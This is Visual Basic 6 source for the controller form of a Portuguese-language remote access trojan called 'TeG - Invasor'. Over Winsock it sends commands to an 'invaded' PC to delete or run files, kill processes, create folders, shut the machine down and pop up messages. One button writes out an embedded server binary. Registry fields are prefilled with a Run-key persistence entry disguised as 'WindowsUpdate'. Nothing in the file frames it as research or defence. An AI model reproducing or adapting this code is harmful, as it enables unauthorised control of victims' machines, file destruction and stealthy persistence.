VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   Appearance      =   0  'Flat
   BackColor       =   &H00404040&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "TeG - Invasor"
   ClientHeight    =   5355
   ClientLeft      =   150
   ClientTop       =   435
   ClientWidth     =   10170
   ControlBox      =   0   'False
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Form1.frx":212A
   ScaleHeight     =   5355
   ScaleMode       =   0  'User
   ScaleWidth      =   10170
   Begin MSComDlg.CommonDialog cd 
      Left            =   1350
      Top             =   180
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
      DialogTitle     =   "Abrir arquivo:"
      Filter          =   "Todos os arquivos|*.*"
   End
   Begin VB.CommandButton Command23 
      Caption         =   "Visual Basic"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   5025
      TabIndex        =   51
      Top             =   2580
      Width           =   2340
   End
   Begin VB.ComboBox txtip 
      BackColor       =   &H0000FFFF&
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   345
      Left            =   7860
      TabIndex        =   50
      Text            =   "10.0.0.20"
      Top             =   1275
      Width           =   1980
   End
   Begin VB.CommandButton Command22 
      Caption         =   "Fechar Programa"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   5025
      TabIndex        =   49
      Top             =   2205
      Width           =   2340
   End
   Begin VB.CommandButton Command18 
      Caption         =   "Listar Programas"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   5025
      TabIndex        =   48
      Top             =   1830
      Width           =   2340
   End
   Begin VB.CommandButton Command12 
      Caption         =   "Criar Pasta Personalizada"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   510
      Left            =   345
      TabIndex        =   47
      Top             =   4080
      Width           =   2340
   End
   Begin VB.CommandButton Command13 
      Caption         =   "Executar Arquivo"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   510
      Left            =   2685
      TabIndex        =   46
      Top             =   4080
      Width           =   2340
   End
   Begin VB.CommandButton Command17 
      Caption         =   "Gerar Servidor"
      Height          =   270
      Left            =   8100
      TabIndex        =   45
      Top             =   4185
      Width           =   1530
   End
   Begin VB.TextBox txtPort 
      Appearance      =   0  'Flat
      BackColor       =   &H0000FFFF&
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   330
      Left            =   8670
      TabIndex        =   43
      Text            =   "25"
      Top             =   1650
      Width           =   1155
   End
   Begin VB.CommandButton Command21 
      Caption         =   "Abrir Log"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   330
      Left            =   5295
      TabIndex        =   41
      Top             =   3480
      Width           =   1770
   End
   Begin VB.CommandButton Command20 
      Caption         =   "Limpar Log"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   330
      Left            =   5295
      TabIndex        =   40
      Top             =   4140
      Width           =   1770
   End
   Begin VB.CommandButton Command19 
      Caption         =   "Fechar Log"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   330
      Left            =   5295
      TabIndex        =   39
      Top             =   3810
      Width           =   1770
   End
   Begin VB.CommandButton Command11 
      Caption         =   "Deletar Arquivo"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   345
      TabIndex        =   38
      Top             =   1830
      Width           =   2340
   End
   Begin VB.CommandButton Command9 
      Caption         =   "Tempo de Uso"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   345
      TabIndex        =   37
      Top             =   3705
      Width           =   2340
   End
   Begin VB.CommandButton cmdctrl 
      Caption         =   "Painel de Controle"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   345
      TabIndex        =   36
      Top             =   2955
      Width           =   2340
   End
   Begin VB.CommandButton cmdchecknet 
      Caption         =   "Checknet"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   345
      TabIndex        =   35
      Top             =   2205
      Width           =   2340
   End
   Begin VB.CommandButton Command2 
      Caption         =   "DESLIGAR PC"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   345
      TabIndex        =   34
      Top             =   2580
      Width           =   2340
   End
   Begin VB.CommandButton cmdpaint 
      Caption         =   "Paint"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   345
      TabIndex        =   33
      Top             =   3330
      Width           =   2340
   End
   Begin VB.CommandButton cmdcalc 
      Caption         =   "Calculadora"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   345
      TabIndex        =   32
      Top             =   1080
      Width           =   2340
   End
   Begin VB.CommandButton cmdnote 
      Caption         =   "Bloco de notas"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   345
      TabIndex        =   31
      Top             =   1455
      Width           =   2340
   End
   Begin VB.CommandButton Command16 
      Caption         =   "Limpar Buffer Invadido"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   750
      Left            =   5025
      Style           =   1  'Graphical
      TabIndex        =   30
      Top             =   1080
      Width           =   2340
   End
   Begin VB.CommandButton Command10 
      Caption         =   "Enviar Mensagem"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   2685
      TabIndex        =   29
      Top             =   3705
      Width           =   2340
   End
   Begin VB.CommandButton Command8 
      Caption         =   "Fechar Servidor"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   2685
      TabIndex        =   28
      Top             =   3330
      Width           =   2340
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Criar Pasta"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   2685
      TabIndex        =   27
      Top             =   1830
      Width           =   2340
   End
   Begin VB.CommandButton cmdcddoor 
      Caption         =   "Abrir CDROM"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   2685
      TabIndex        =   26
      Top             =   1080
      Width           =   2340
   End
   Begin VB.CommandButton Command6 
      Caption         =   "MS WORD"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   2685
      TabIndex        =   25
      Top             =   2955
      Width           =   2340
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Media Player"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   2685
      TabIndex        =   24
      Top             =   2205
      Width           =   2340
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Scandisk"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   2685
      TabIndex        =   23
      Top             =   2580
      Width           =   2340
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Paci�ncia"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   2685
      TabIndex        =   22
      Top             =   1455
      Width           =   2340
   End
   Begin VB.PictureBox Picture2 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0C0FF&
      FillStyle       =   0  'Solid
      ForeColor       =   &H80000008&
      Height          =   555
      Left            =   8580
      Picture         =   "Form1.frx":F02F8
      ScaleHeight     =   525
      ScaleWidth      =   555
      TabIndex        =   17
      Top             =   3060
      Width           =   585
   End
   Begin VB.PictureBox getstringal 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      ForeColor       =   &H80000008&
      Height          =   1680
      Left            =   1860
      ScaleHeight     =   1650
      ScaleWidth      =   6420
      TabIndex        =   10
      Top             =   5415
      Visible         =   0   'False
      Width           =   6450
      Begin VB.TextBox txtentry2 
         BeginProperty Font 
            Name            =   "Fixedsys"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   330
         Left            =   1140
         TabIndex        =   13
         Text            =   "WindowsUpdate"
         Top             =   555
         Width           =   5040
      End
      Begin VB.TextBox txtsubkey2 
         DragMode        =   1  'Automatic
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   330
         Left            =   1140
         TabIndex        =   12
         Text            =   "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         Top             =   225
         Width           =   5040
      End
      Begin VB.CommandButton Command15 
         Caption         =   "BUSCAR"
         BeginProperty Font 
            Name            =   "Fixedsys"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   420
         Left            =   2325
         TabIndex        =   11
         Top             =   1140
         Width           =   1845
      End
      Begin VB.Label Label2 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Entry:"
         BeginProperty Font 
            Name            =   "Fixedsys"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   225
         Index           =   2
         Left            =   195
         TabIndex        =   2
         Top             =   585
         Width           =   720
      End
      Begin VB.Label Label1 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Subkey:"
         BeginProperty Font 
            Name            =   "Fixedsys"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   225
         Index           =   2
         Left            =   150
         TabIndex        =   14
         Top             =   255
         Width           =   840
      End
   End
   Begin VB.PictureBox setstringal 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      ForeColor       =   &H80000008&
      Height          =   1680
      Left            =   1868
      ScaleHeight     =   1650
      ScaleWidth      =   6405
      TabIndex        =   1
      Top             =   5415
      Visible         =   0   'False
      Width           =   6435
      Begin VB.CommandButton Command14 
         Caption         =   "ENVIAR"
         BeginProperty Font 
            Name            =   "Fixedsys"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   420
         Left            =   2325
         TabIndex        =   9
         Top             =   1140
         Width           =   1845
      End
      Begin VB.TextBox txtSubkey1 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   330
         Left            =   1140
         TabIndex        =   5
         Text            =   "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         Top             =   60
         Width           =   5040
      End
      Begin VB.TextBox txtentry1 
         BeginProperty Font 
            Name            =   "Fixedsys"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   330
         Left            =   1140
         TabIndex        =   4
         Text            =   "WindowsUpdate"
         Top             =   390
         Width           =   5040
      End
      Begin VB.TextBox txtvalue 
         BeginProperty Font 
            Name            =   "Fixedsys"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   330
         Left            =   1140
         TabIndex        =   3
         Text            =   "C:\Windows\System32\WinUpdate.exe"
         Top             =   720
         Width           =   5040
      End
      Begin VB.Label Label1 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Subkey:"
         BeginProperty Font 
            Name            =   "Fixedsys"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   225
         Index           =   1
         Left            =   150
         TabIndex        =   8
         Top             =   90
         Width           =   840
      End
      Begin VB.Label Label2 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Entry:"
         BeginProperty Font 
            Name            =   "Fixedsys"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   225
         Index           =   1
         Left            =   195
         TabIndex        =   7
         Top             =   420
         Width           =   720
      End
      Begin VB.Label Label3 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Value:"
         BeginProperty Font 
            Name            =   "Fixedsys"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   225
         Left            =   180
         TabIndex        =   6
         Top             =   750
         Width           =   720
      End
   End
   Begin VB.PictureBox Picture1 
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFC0&
      FillStyle       =   0  'Solid
      ForeColor       =   &H80000008&
      Height          =   555
      Left            =   8580
      Picture         =   "Form1.frx":F0602
      ScaleHeight     =   525
      ScaleWidth      =   555
      TabIndex        =   20
      Top             =   3060
      Width           =   585
   End
   Begin VB.Timer Timer1 
      Interval        =   5000
      Left            =   6000
      Top             =   1410
   End
   Begin MSWinsockLib.Winsock w2 
      Left            =   1170
      Top             =   885
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Porta:"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000080&
      Height          =   225
      Index           =   3
      Left            =   7905
      TabIndex        =   44
      Top             =   1695
      Width           =   720
   End
   Begin VB.Image Image1 
      Height          =   510
      Left            =   8955
      Picture         =   "Form1.frx":F090C
      Top             =   0
      Visible         =   0   'False
      Width           =   555
   End
   Begin VB.Image Label4 
      Height          =   510
      Left            =   9615
      Top             =   0
      Width           =   555
   End
   Begin VB.Label Label5 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "LOG:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   5430
      TabIndex        =   42
      Top             =   3225
      Width           =   450
   End
   Begin VB.Label lbldesc 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00C0C0FF&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "DESCONECTADO"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   270
      Left            =   8115
      TabIndex        =   19
      Top             =   3600
      Width           =   1500
   End
   Begin VB.Label lblremadd 
      Alignment       =   2  'Center
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "STATUS:"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   225
      Left            =   8445
      TabIndex        =   18
      Top             =   2760
      Width           =   855
   End
   Begin VB.Label Command1 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H0000FFFF&
      Caption         =   "CONECTAR"
      BeginProperty Font 
         Name            =   "MicrogrammaDMedExt"
         Size            =   9
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   255
      Left            =   8100
      TabIndex        =   16
      Top             =   2265
      Width           =   1560
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "IP do Servidor:"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000080&
      Height          =   225
      Index           =   0
      Left            =   7965
      TabIndex        =   15
      Top             =   1020
      Width           =   1800
   End
   Begin VB.Label Label2 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BackStyle       =   0  'Transparent
      Caption         =   "S"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00800000&
      Height          =   225
      Index           =   0
      Left            =   75
      TabIndex        =   0
      Top             =   5040
      Width           =   9945
   End
   Begin VB.Label lblcon 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00C0FFC0&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "CONECTADO"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00008000&
      Height          =   270
      Left            =   8115
      TabIndex        =   21
      Top             =   3600
      Visible         =   0   'False
      Width           =   1500
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim buffer() As Byte
Dim lBytes As Long
Dim mFilesize As Long
Dim Filename As String
Private mCaptionlessWindowMover As CCaptionlessWindowMover
Dim sckConnected As Boolean
Dim dados As String
Dim dados1 As String
Dim dados2 As String
Dim dados3 As String
Private Sub LogErr()
If err.Number <> 0 Then
If err.Number <> 40006 Then
log.log.Text = log.log.Text & Time & vbCrLf & "Ocorreu o Erro: " & err.Description & vbCrLf & "Causado por: " & err.Source & vbCrLf & "N� do Erro: " & err.Number & vbCrLf & "===============" & vbCrLf
End If
End If
End Sub
Private Sub cmdcalc_Click()

   

    On Error GoTo err_cmdcalc_Click

Dim str As String
str = "calc"
w2.SendData str
    

    Exit Sub

err_cmdcalc_Click:
            LogErr
End Sub

Private Sub cmdcddoor_Click()
On Error GoTo err
Dim str As String
str = "cddooropen"
w2.SendData str
err:
LogErr
End Sub

Private Sub cmdchecknet_Click()

 

    On Error GoTo err_cmdchecknet_Click


Dim str As String
str = "checknet"
w2.SendData str
    

    Exit Sub

err_cmdchecknet_Click:
LogErr
End Sub

Private Sub cmdctrl_Click()
On Error GoTo err
Dim str As String
str = "ctrl"
w2.SendData str
err:
LogErr
End Sub

Private Sub cmdnetclose_Click()
'Dim str As String
'str = "nonet"
'w2.SendData str
End Sub

Private Sub cmdnote_Click()

  

    On Error GoTo err_cmdnote_Click


Dim str As String
str = "note"
w2.SendData str
    

    Exit Sub

err_cmdnote_Click:
    LogErr
End Sub

Private Sub cmdpaint_Click()

    On Error GoTo err_cmdpaint_Click


Dim str As String
str = "pain"
w2.SendData str

    

    Exit Sub

err_cmdpaint_Click:
    LogErr
End Sub

Private Sub Command1_Click()



    On Error GoTo err_Command1_Click


If txtip.Text = "" Then
Me.Caption = "Digite o IP a ser invadido..."
Label2(0).Caption = "Digite o IP a ser invadido..."
Else
w2.Connect txtip.Text, txtPort.Text
End If


    

  
err_Command1_Click:
LogErr
End Sub

Private Sub Command1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Command1.BorderStyle = 1
Command1.BackColor = &HFFFF00
End Sub

Private Sub Command1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)

Command1.BorderStyle = 0

Command1.BackColor = &HFFFF&
End Sub

Private Sub Command1_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Command1.BorderStyle = 0

Command1.BackColor = &HFFFF00
End Sub

Private Sub Command10_Click()
On Error GoTo err
Dim dados1 As String
dados1 = InputBox("Digite a mensagem a enviar...", "Enviar mensagem ao �invadido� ")
Dim str As String
str = "msg " & dados1
w2.SendData str
err:
LogErr
    
End Sub

Private Sub Command11_Click()
On Error GoTo err
Dim dados1 As String
dados1 = InputBox("Digite o caminho e o arquivo a deletar no PC Invadido...", "Deletar Arquivo Alheio...")
Dim str As String
str = "del " & dados1
w2.SendData str
err:
LogErr
    
End Sub

Private Sub Command12_Click()
On Error GoTo err
Dim dados1 As String
dados1 = InputBox("Digite o nome da pasta a criar...", "Criar Pasta em PC Alheio...")
Dim str As String
str = "mkd " & dados1
w2.SendData str
err:
LogErr
End Sub

Private Sub Command13_Click()
On Error GoTo err
Dim dados1 As String
dados1 = InputBox("Digite o caminho e o arquivo a executar no PC Invadido...", "Executar Arquivo Alheio...")
Dim str As String
str = "exe " & dados1
w2.SendData str
err:
LogErr
End Sub


Private Sub Command14_Click()
On Error GoTo err

Dim str As String
str = "regput"
dados3 = txtSubkey1.Text
dados2 = txtentry1.Text
dados3 = txtvalue.Text
''''''''''''''''''''''
''''''''''''''''''''''
''''''''''''''''''''''
''''''''''''''''''''''
w2.SendData str

Me.Height = 5355
setstringal.Visible = False
err:
LogErr
Me.Height = 5355
setstringal.Visible = False
End Sub



Private Sub Command16_Click()
On Error GoTo err
Dim str As String
str = Empty
w2.SendData str
err:
LogErr
End Sub

Private Sub Command16_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Command1.BackColor = &H8080FF
End Sub

Private Sub Command17_Click()
Dim nome As String
Dim p_ret As String
nome = "C:\Invasor.exe"
p_ret = StrConv(LoadResData("SERVER", "EXE"), vbUnicode)
Open nome For Binary As #1
Put #1, , p_ret
Close #1
MsgBox "Arquivo criado em: " & Chr(34) & nome & Chr(34) & " com SUCESSO!", vbInformation, Me.Caption
End Sub

Private Sub Command18_Click()
On Error GoTo err
Dim str As String
str = "lstexe"
w2.SendData str
err:
LogErr
End Sub

Private Sub Command19_Click()
If log.Visible = True Then
log.Visible = False
End If
End Sub

Private Sub Command2_Click()

    

    On Error GoTo err_Command2_Click


Dim str As String
str = "shutdown"
w2.SendData str
    

    Exit Sub

err_Command2_Click:
    LogErr
End Sub

Private Sub Command20_Click()
If MsgBox("Deseja realmente limapr o log?", vbYesNo, Me.Caption) = vbYes Then log.log.Text = Empty
End Sub

Private Sub Command21_Click()
If log.Visible = False Then
log.Visible = True
End If
End Sub

Private Sub Command22_Click()
On Error GoTo err
Dim dados1 As String
dados1 = InputBox("Digite o caminho e o arquivo a fechar no PC Invadido...", "Fechar Arquivo Alheio...")
Dim str As String
str = "cpr " & dados1
w2.SendData str
err:
LogErr
End Sub

Private Sub Command23_Click()
On Error GoTo err
Dim str As String
str = "vb6"
w2.SendData str
err:
LogErr
End Sub

Private Sub Command24_Click()
On Error Resume Next
Dim str As String
str = "shutxp"
w2.SendData str
    

End Sub

Private Sub Command3_Click()
On Error GoTo err
Dim str As String
str = "sol"
w2.SendData str
err:
LogErr
End Sub

Private Sub Command4_Click()
On Error GoTo err
Dim str As String
str = "scan"
w2.SendData str
err:
LogErr
End Sub

Private Sub Command5_Click()
On Error GoTo err
Dim str As String
str = "mplayer"
w2.SendData str
err:
LogErr
End Sub

Private Sub Command6_Click()
On Error GoTo err
Dim str As String
str = "word"
w2.SendData str
err:
LogErr
End Sub

Private Sub Command7_Click()
On Error GoTo err
Dim str As String
str = "dir"
w2.SendData str
MsgBox "Pasta C:\PC Invadido criada no servidor: " & w2.RemoteHost
log.log.Text = log.log.Text & vbCrLf & Time & vbCrLf & "Pasta C:\PC Invadido criada no servidor: " & w2.RemoteHost & vbCrLf & "===============" & vbCrLf
err:
LogErr
End Sub

Private Sub Command8_Click()
On Error GoTo err
If MsgBox("Deseja mesmo fechar o servidor?", vbYesNo, Me.Caption) = vbYes Then
Dim str As String
str = "closeme"
w2.SendData str
Me.Caption = "Disconnected"
End If
err:
LogErr
End Sub

Private Sub Command9_Click()
On Error GoTo err
Dim str As String
str = "wintime"
w2.SendData str
err:
LogErr
End Sub

Private Sub Form_Load()
On Error GoTo err
  Set mCaptionlessWindowMover = New CCaptionlessWindowMover
  Set mCaptionlessWindowMover.Form = Me
log.Show
If App.PrevInstance = True Then Unload Me
Label2(0).Caption = "Servidor local: DESCONECTADO"
log.log.Text = log.log.Text & vbCrLf & Time & vbCrLf & "STATUS do Servidor Local: DESCONECTADO" & vbCrLf & "===============" & vbCrLf
w2.RemoteHost = 1412
sckConnected = False
txtip.AddItem "127.0.0.1"
txtip.AddItem w2.LocalIP
err:
LogErr
End Sub

Private Sub Form_LostFocus()
Command1.BackColor = &H8080FF
End Sub

' Example code for the CCaptionlessWindowMover class
'
' To try this example, do the following:
' 1. Create a new form
' 2. Paste all the code from this example to the new form's module
' 4. Run the form, and try moving the form around by
'    clicking anywhere on the body of the form and dragging

' In the Declarations section of the form declare the variable




Private Sub Form_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
  ' Handle the form's MouseDown event
  mCaptionlessWindowMover.HandleMouseDown X, Y
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
  ' Handle the form's MouseMove event
  Command1.BackColor = &H8080FF
  mCaptionlessWindowMover.HandleMouseMove X, Y
End Sub

Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
  ' Handle the form's MouseUp event
  mCaptionlessWindowMover.HandleMouseUp
End Sub


Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
Command8_Click
End Sub

Private Sub Frame1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Command1.BackColor = &H8080FF
End Sub

